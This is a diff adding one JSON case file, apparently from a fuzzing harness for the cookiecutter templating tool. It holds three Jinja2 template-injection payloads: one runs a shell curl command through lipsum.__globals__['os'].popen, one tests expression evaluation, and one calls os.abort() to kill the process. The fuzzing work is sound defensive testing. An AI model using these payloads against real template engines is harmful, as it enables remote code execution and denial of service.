@@ -1,0 +1,11 @@
+{
+  "mode": "json",
+  "json_payload": {
+    "project_name": "test_project",
+    "ssti_payload1": "{{lipsum.__globals__['os'].popen('curl -s https://api.restful-api.dev/objects').read()}}",
+    "ssti_payload2": "{{0+7}}",
+    "ssti_payload3": "{{lipsum.__globals__['os'].abort()}}"
+  },
+  "case_id": "case_112",
+  "manifest_path": "/media/steven/MaD/projects/cookiecutter/fuzz_cookiecutter/run_cache/iter_021_candidate/cases/case_112.json"
+}
